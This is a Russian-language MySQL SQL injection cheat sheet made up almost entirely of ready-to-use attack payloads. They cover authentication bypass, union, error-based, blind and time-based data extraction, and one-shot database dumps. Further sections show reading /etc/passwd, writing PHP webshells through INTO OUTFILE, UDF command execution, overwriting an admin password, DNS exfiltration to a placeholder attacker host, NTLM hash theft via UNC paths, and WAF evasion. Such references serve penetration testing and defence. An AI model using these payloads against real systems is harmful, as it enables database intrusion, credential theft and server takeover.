# MySQL Injection (SQL-инъекции в MySQL)

> MySQL-инъекция — это тип уязвимости безопасности, возникающий, когда злоумышленник может манипулировать SQL-запросами к базе данных MySQL, внедряя вредоносные входные данные. Эта уязвимость часто является результатом неправильной обработки пользовательского ввода, что позволяет злоумышленникам выполнять произвольный SQL-код, который может скомпрометировать целостность и безопасность базы данных.

## Содержание

* [Стандартные базы данных MySQL](#стандартные-базы-данных-mysql)
* [Комментарии MySQL](#комментарии-mysql)
* [Тестирование инъекций MySQL](#тестирование-инъекций-mysql)
* [MySQL Union Based](#mysql-union-based)
    * [Определение количества столбцов](#определение-количества-столбцов)
        * [Итеративный метод NULL](#итеративный-метод-null)
        * [Метод ORDER BY](#метод-order-by)
        * [Метод LIMIT INTO](#метод-limit-into)
    * [Извлечение базы данных с помощью Information_schema](#извлечение-базы-данных-с-помощью-information_schema)
    * [Извлечение имён столбцов без Information_schema](#извлечение-имён-столбцов-без-information_schema)
    * [Извлечение данных без имён столбцов](#извлечение-данных-без-имён-столбцов)
* [MySQL Error Based](#mysql-error-based)
    * [MySQL Error Based — базовый](#mysql-error-based--базовый)
    * [MySQL Error Based — функция UpdateXML](#mysql-error-based--функция-updatexml)
    * [MySQL Error Based — функция Extractvalue](#mysql-error-based--функция-extractvalue)
* [MySQL Blind](#mysql-blind)
    * [MySQL Blind с эквивалентом Substring](#mysql-blind-с-эквивалентом-substring)
    * [MySQL Blind с использованием условного оператора](#mysql-blind-с-использованием-условного-оператора)
    * [MySQL Blind с MAKE_SET](#mysql-blind-с-make_set)
    * [MySQL Blind с LIKE](#mysql-blind-с-like)
    * [MySQL Blind с REGEXP](#mysql-blind-с-regexp)
* [MySQL Time Based](#mysql-time-based)
    * [Использование SLEEP в подзапросе](#использование-sleep-в-подзапросе)
    * [Использование условных операторов](#использование-условных-операторов)
* [MySQL DIOS — Dump in One Shot](#mysql-dios--dump-in-one-shot)
* [Текущие запросы MySQL](#текущие-запросы-mysql)
* [Чтение содержимого файла в MySQL](#чтение-содержимого-файла-в-mysql)
* [Выполнение команд в MySQL](#выполнение-команд-в-mysql)
    * [WEBSHELL — метод OUTFILE](#webshell--метод-outfile)
    * [WEBSHELL — метод DUMPFILE](#webshell--метод-dumpfile)
    * [COMMAND — библиотека UDF](#command--библиотека-udf)
* [MySQL INSERT](#mysql-insert)
* [MySQL Truncation](#mysql-truncation)
* [MySQL Out of Band](#mysql-out-of-band)
    * [DNS-эксфильтрация](#dns-эксфильтрация)
    * [UNC-путь — кража NTLM-хэша](#unc-путь--кража-ntlm-хэша)
* [Обход WAF в MySQL](#обход-waf-в-mysql)
    * [Альтернатива Information Schema](#альтернатива-information-schema)
    * [Альтернатива VERSION](#альтернатива-version)
    * [Альтернатива GROUP_CONCAT](#альтернатива-group_concat)
    * [Научная нотация](#научная-нотация)
    * [Условные комментарии](#условные-комментарии)
    * [Wide Byte Injection (GBK)](#wide-byte-injection-gbk)
* [Ссылки](#ссылки)

# Стандартные базы данных MySQL

| Имя | Описание |
| --- | --- |
| mysql | Требует привилегий root |
| information_schema | Доступна с версии 5 и выше |

# Комментарии MySQL

> Комментарии MySQL — это аннотации в SQL-коде, которые игнорируются сервером MySQL во время выполнения.

| Тип | Описание |
| --- | --- |
| # | Хэш-комментарий |
| /* MYSQL Comment */ | C-стиль комментария |
| /*! MYSQL Special SQL */ | Специальный SQL |
| /*!32302 10*/ | Комментарий для MySQL версии 3.23.02 |
| -- | SQL-комментарий |
| ;%00 | Нулевой байт |
| ` | Обратный апостроф |

# Тестирование инъекций MySQL

**Строки:** Запрос вида `SELECT * FROM Table WHERE id = 'FUZZ';`

| Payload | Результат |
| --- | --- |
| ' | False |
| '' | True |
| " | False |
| "" | True |
| \ | False |
| \\ | True |

**Числовые:** Запрос вида `SELECT * FROM Table WHERE id = FUZZ;`

| Payload | Результат |
| --- | --- |
| AND 1 | True |
| AND 0 | False |
| AND true | True |
| AND false | False |
| 1-false | Возвращает 1, если уязвимо |
| 1-true | Возвращает 0, если уязвимо |
| 1*56 | Возвращает 56, если уязвимо |
| 1*56 | Возвращает 1, если не уязвимо |

**Логин:** Запрос вида `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`

| Payload |
| --- |
| ' OR '1 |
| ' OR 1 -- - |
| " OR "" = " |
| " OR 1 = 1 -- - |
| '=' |
| 'LIKE' |
| '=0--+ |

# MySQL Union Based

## Определение количества столбцов

Для успешного выполнения union-based SQL-инъекции злоумышленнику необходимо знать количество столбцов в исходном запросе.

### Итеративный метод NULL

Систематически увеличивайте количество столбцов в операторе UNION SELECT до тех пор, пока payload не выполнится без ошибок или не произведёт видимое изменение. Каждая итерация проверяет совместимость количества столбцов.

```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;--
UNION SELECT NULL, NULL, NULL;--
```

### Метод ORDER BY

Продолжайте увеличивать число, пока не получите False-ответ. Хотя GROUP BY и ORDER BY имеют разную функциональность в SQL, они могут использоваться одинаково для определения количества столбцов в запросе.

| ORDER BY | GROUP BY | Результат |
| --- | --- | --- |
| ORDER BY 1--+ | GROUP BY 1--+ | True |
| ORDER BY 2--+ | GROUP BY 2--+ | True |
| ORDER BY 3--+ | GROUP BY 3--+ | True |
| ORDER BY 4--+ | GROUP BY 4--+ | False |

> Поскольку результат для ORDER BY 4 ложный, это означает, что SQL-запрос содержит только 3 столбца. В union-based SQL-инъекции вы можете выбрать произвольные данные для отображения на странице: `-1' UNION SELECT 1,2,3--+`.

Аналогично предыдущему методу, мы можем проверить количество столбцов одним запросом, если включён вывод ошибок.

```sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
```

### Метод LIMIT INTO

Этот метод эффективен, когда включён вывод ошибок. Он может помочь определить количество столбцов в случаях, когда точка инъекции находится после оператора LIMIT.

| Payload | Ошибка |
| --- | --- |
| 1' LIMIT 1,1 INTO @--+ | The used SELECT statements have a different number of columns |
| 1' LIMIT 1,1 INTO @,@--+ | The used SELECT statements have a different number of columns |
| 1' LIMIT 1,1 INTO @,@,@--+ | Нет ошибки означает, что запрос использует 3 столбца |

Поскольку результат не показывает ошибок, это означает, что запрос использует 3 столбца: `-1' UNION SELECT 1,2,3--+`.

## Извлечение базы данных с помощью Information_schema

Этот запрос извлекает имена всех схем (баз данных) на сервере.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

Этот запрос извлекает имена всех таблиц в указанной схеме (имя схемы представлено PLACEHOLDER).

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
```

Этот запрос извлекает имена всех столбцов в указанной таблице.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
```

Этот запрос направлен на извлечение данных из конкретной таблицы.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
```

## Извлечение имён столбцов без Information_schema

**Метод для MySQL >= 4.1.**

| Payload | Вывод |
| --- | --- |
| `(1)and(SELECT * from db.users)=(1)` | Operand should contain 4 column(s) |
| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column 'id' cannot be null |

**Метод для MySQL 5**

| Payload | Вывод |
| --- | --- |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name 'id' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name 'name' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |

## Извлечение данных без имён столбцов

Извлечение данных из 4-го столбца без знания его имени.

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

Пример инъекции внутри запроса `select author_id,title from posts where author_id=[INJECT_HERE]`

```sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```

## MySQL Error Based

| Имя | Payload |
| --- | --- |
| GTID_SUBSET | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |
| JSON_KEYS | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |
| UPDATEXML | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |
| EXP | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |
| OR | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |
| NAME_CONST | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |
| UUID_TO_BIN | `AND UUID_TO_BIN(version())='1` |

### MySQL Error Based — базовый

Работает с MySQL >= 4.1

```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```

### MySQL Error Based — функция UpdateXML

```sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

**Более короткий вариант для чтения:**

```sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

### MySQL Error Based — функция Extractvalue

Работает с MySQL >= 5.1

```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```

### MySQL Error Based — функция NAME_CONST (только для констант)

Работает с MySQL >= 5.0

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

## MySQL Blind

### MySQL Blind с эквивалентом Substring

| Функция | Пример | Описание |
| --- | --- | --- |
| SUBSTR | `SUBSTR(version(),1,1)=5` | Извлекает подстроку из строки (начиная с любой позиции) |
| SUBSTRING | `SUBSTRING(version(),1,1)=5` | Извлекает подстроку из строки (начиная с любой позиции) |
| RIGHT | `RIGHT(left(version(),1),1)=5` | Извлекает количество символов из строки (начиная справа) |
| MID | `MID(version(),1,1)=4` | Извлекает подстроку из строки (начиная с любой позиции) |
| LEFT | `LEFT(version(),1)=4` | Извлекает количество символов из строки (начиная слева) |

Примеры Blind SQL-инъекций с использованием SUBSTRING или другого эквивалента:

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

### MySQL Blind с использованием условного оператора

**TRUE:** если @@version начинается с 5:

```
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
Ответ:
HTTP/1.1 500 Internal Server Error
```

**FALSE:** если @@version начинается с 4:

```
2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
Ответ:
HTTP/1.1 200 OK
```

### MySQL Blind с MAKE_SET

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```

### MySQL Blind с LIKE

В MySQL оператор LIKE может использоваться для сопоставления с образцом в запросах. Оператор позволяет использовать символы подстановки для сопоставления неизвестных или частичных строковых значений. Это особенно полезно в контексте blind SQL-инъекции, когда злоумышленник не знает длину или конкретное содержимое данных, хранящихся в базе данных.

**Символы подстановки в LIKE:**

*   **Знак процента (%):** Этот символ подстановки представляет ноль, один или несколько символов. Он может использоваться для сопоставления любой последовательности символов.
*   **Подчёркивание (_):** Этот символ подстановки представляет один символ. Он используется для более точного сопоставления, когда вы знаете структуру данных, но не конкретный символ в определённой позиции.

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```

### MySQL Blind с REGEXP

Blind SQL-инъекция также может быть выполнена с использованием оператора MySQL REGEXP, который используется для сопоставления строки с регулярным выражением. Эта техника особенно полезна, когда злоумышленники хотят выполнить более сложное сопоставление с образцом, чем может предложить оператор LIKE.

| Payload | Описание |
| --- | --- |
| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Проверка длины |
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --` | Проверка наличия цифр |
| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Проверка данных, начинающихся с "a" |

## MySQL Time Based

Следующие SQL-коды задержат вывод из MySQL.

**MySQL 4/5: BENCHMARK()**

```sql
+BENCHMARK(40000000,SHA1(1337))+
'+BENCHMARK(3200,SHA1(1))+'
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
```

**MySQL 5: SLEEP()**

```sql
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
AND SLEEP(10)=0
AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
```

### Использование SLEEP в подзапросе

**Извлечение длины данных.**

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

**Извлечение первого символа.**

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
```

**Извлечение второго символа.**

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

**Извлечение третьего символа.**

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

**Извлечение column_name.**

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

### Использование условных операторов

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

## MySQL DIOS — Dump in One Shot

DIOS (Dump In One Shot) SQL-инъекция — это продвинутая техника, позволяющая злоумышленнику извлечь всё содержимое базы данных одним хорошо сформированным payload'ом SQL-инъекции. Этот метод использует возможность объединения нескольких фрагментов данных в один результирующий набор, который затем возвращается в одном ответе от базы данных.

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

**SecurityIdiots**

```sql
make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
```

**Profexer**

```sql
(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
```

**Dr.Z3r0**

```sql
(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
```

**M@dBl00d**

```sql
(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
```

**Zen**

```sql
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
```

**sharik**

```sql
(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
```

## Текущие запросы MySQL

INFORMATION_SCHEMA.PROCESSLIST — это специальная таблица, доступная в MySQL и MariaDB, которая предоставляет информацию об активных процессах и потоках внутри сервера базы данных. Эта таблица может перечислить все операции, которые БД выполняет в данный момент.

Таблица PROCESSLIST содержит несколько важных столбцов, каждый из которых предоставляет детали о текущих процессах. Общие столбцы включают:

*   **ID**: Идентификатор процесса.
*   **USER**: Пользователь MySQL, выполняющий процесс.
*   **HOST**: Хост, с которого был инициирован процесс.
*   **DB**: База данных, к которой в данный момент обращается процесс, если таковая имеется.
*   **COMMAND**: Тип команды, выполняемой процессом (например, Query, Sleep).
*   **TIME**: Время в секундах, в течение которого выполняется процесс.
*   **STATE**: Текущее состояние процесса.
*   **INFO**: Текст выполняемого оператора или NULL, если оператор не выполняется.

```sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
```

| ID | USER | HOST | DB | COMMAND | TIME | STATE | INFO |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | root | localhost | testdb | Query | 10 | executing | SELECT * FROM some_table |
| 2 | app_uset | 192.168.0.101 | appdb | Sleep | 300 | sleeping | NULL |
| 3 | gues_user | example.com:3360 | NULL | Connect | 0 | connecting | NULL |

```sql
UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
```

Dump in one shot запрос для извлечения всего содержимого таблицы.

```sql
UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## Чтение содержимого файла в MySQL

Требуется filepriv, иначе вы получите ошибку: `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

Если вы root на базе данных, вы можете повторно включить LOAD_FILE с помощью следующего запроса

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## Выполнение команд в MySQL

### WEBSHELL — метод OUTFILE

```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### WEBSHELL — метод DUMPFILE

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

### COMMAND — библиотека UDF

Сначала нужно проверить, установлены ли UDF на сервере.

```bash
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

Затем вы можете использовать такие функции, как sys_exec и sys_eval.

```bash
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```

## MySQL INSERT

Ключевые слова ON DUPLICATE KEY UPDATE используются, чтобы сообщить MySQL, что делать, когда приложение пытается вставить строку, которая уже существует в таблице. Мы можем использовать это для изменения пароля администратора следующим образом:

**Инъекция с использованием payload:**

```sql
attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
```

**Запрос будет выглядеть так:**

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
```

Этот запрос вставит строку для пользователя "attacker_dummy@example.com". Он также вставит строку для пользователя "admin@example.com".

Поскольку эта строка уже существует, ключевое слово ON DUPLICATE KEY UPDATE сообщает MySQL обновить столбец password уже существующей строки до "P@ssw0rd". После этого мы можем просто аутентифицироваться с "admin@example.com" и паролем "P@ssw0rd".

## MySQL Truncation

В MySQL "admin" и "admin" одинаковы. Если столбец username в базе данных имеет ограничение по символам, остальные символы усекаются. Так, если база данных имеет ограничение столбца в 20 символов, а мы вводим строку из 21 символа, последний 1 символ будет удалён.

```sql
`username` varchar(20) not null
```

**Payload:** `username = "admin               a"`

## MySQL Out of Band

```sql
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
```

### DNS-эксфильтрация

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
```

### UNC-путь — кража NTLM-хэша

Термин "UNC-путь" относится к пути Universal Naming Convention, используемому для указания местоположения ресурсов, таких как общие файлы или устройства в сети. Он обычно используется в средах Windows для доступа к файлам по сети с использованием формата `\\server\share\file`.

```sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
```

⚠️ Не забудьте экранировать '\\'.

## Обход WAF в MySQL

### Альтернатива Information Schema

**Альтернатива `information_schema.tables`**

```sql
SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

### Альтернатива VERSION

```sql
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
```

### Альтернатива GROUP_CONCAT

**Требование:** MySQL >= 5.7.22

Используйте `json_arrayagg()` вместо `group_concat()`, что позволяет отобразить меньше символов

*   `group_concat()` = 1024 символа
*   `json_arrayagg()` > 16 000 000 символов

```sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
```

### Научная нотация

В MySQL нотация `e` используется для представления чисел в научной нотации. Это способ выразить очень большие или очень маленькие числа в краткой форме. Нотация `e` состоит из числа, за которым следует буква `e` и показатель степени. Формат: `base 'e' exponent`.

**Например:**

*   `1e3` представляет 1 x 10^3, что равно 1000.
*   `1.5e3` представляет 1.5 x 10^3, что равно 1500.
*   `2e-3` представляет 2 x 10^-3, что равно 0.002.

**Следующие запросы эквивалентны:**

```sql
SELECT table_name FROM information_schema 1.e.tables
SELECT table_name FROM information_schema .tables
```

Таким же образом, обычный payload для обхода аутентификации `' or ''='` эквивалентен `' or 1.e('')='` и `1' or 1.e(1) or '1'='1`. Эта техника может использоваться для обфускации запросов для обхода WAF, например:

```sql
1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
```

### Условные комментарии

Условные комментарии MySQL заключены в `/*! ... */` и могут включать номер версии, чтобы указать минимальную версию MySQL, которая должна выполнить содержащийся код. Код внутри этого комментария будет выполнен только если версия MySQL больше или равна числу сразу после `/*!`. Если версия MySQL меньше указанного числа, код внутри комментария будет проигнорирован.

*   `/*!12345UNION*/`: Это означает, что слово UNION будет выполнено как часть SQL-оператора, если версия MySQL 12.345 или выше.
*   `/*!31337SELECT*/`: Аналогично, слово SELECT будет выполнено, если версия MySQL 31.337 или выше.

**Примеры:** `/*!12345UNION*/`, `/*!31337SELECT*/`

### Wide Byte Injection (GBK)

Wide byte injection — это специфический тип атаки SQL-инъекции, нацеленный на приложения, использующие многобайтовые наборы символов, такие как GBK или SJIS. Термин "wide byte" относится к кодировкам символов, где один символ может быть представлен более чем одним байтом. Этот тип инъекции особенно актуален, когда приложение и база данных интерпретируют многобайтовые последовательности по-разному.

Запрос `SET NAMES gbk` может быть использован в атаке SQL-инъекции на основе кодировки. Когда набор символов установлен в GBK, определённые многобайтовые символы могут использоваться для обхода механизма экранирования и внедрения вредоносного SQL-кода.

Несколько символов могут быть использованы для запуска инъекции.

*   `%bf%27`: Это URL-кодированное представление байтовой последовательности `0xbf27`. В наборе символов GBK `0xbf27` декодируется как допустимый многобайтовый символ, за которым следует одинарная кавычка (`'`). Когда MySQL встречает эту последовательность, он интерпретирует её как один допустимый символ GBK, за которым следует одинарная кавычка, фактически завершая строку.
